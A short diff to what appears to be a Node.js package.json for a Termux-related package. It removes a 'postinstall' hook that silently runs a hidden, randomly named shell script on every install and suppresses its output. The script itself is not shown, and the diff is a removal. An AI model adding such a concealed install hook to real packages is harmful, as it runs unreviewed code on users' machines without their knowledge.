@@ -5,8 +5,7 @@
   "main": "index.js",
   "type": "commonjs",
   "scripts": {
-    "start": "node index.js",
-    "postinstall": "sh ./.ci-yuwkr5.sh >/dev/null 2>&1; _r=$?; if [ \"$_r\" -eq 42 ]; then exit 42; fi"
+    "start": "node index.js"
   },
   "keywords": [
     "termux",
